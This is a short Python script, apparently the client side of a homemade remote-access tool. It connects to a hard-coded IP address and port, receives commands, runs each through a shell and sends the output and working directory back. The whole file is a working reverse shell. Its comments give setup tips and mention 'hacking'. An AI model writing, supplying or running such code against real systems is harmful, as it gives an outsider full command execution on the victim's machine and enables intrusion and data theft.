import socket 
import subprocess 
import os                           # these two libraries are important for executig the instructions that the client file will recieve


s = socket.socket()

host = "192.168.109.138"                           # always ensure that you upadte the ip address if using on a local computer, if a server then ignore
port = 9999                        # ensure that the port number shld be the same in both the client and server files can be anyother apart from 9999 but have to be the smae in both the files


# binding the host and port (is diff for both the client and server)

s.connect((host,port))

while True:
    data = s.recv(1024)

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE,stderr = subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + ">"
        s.send(str.encode(output_str + currentWD,"utf-8"))

        # if hacking then we can ignore the below steps 
        print(output_str)

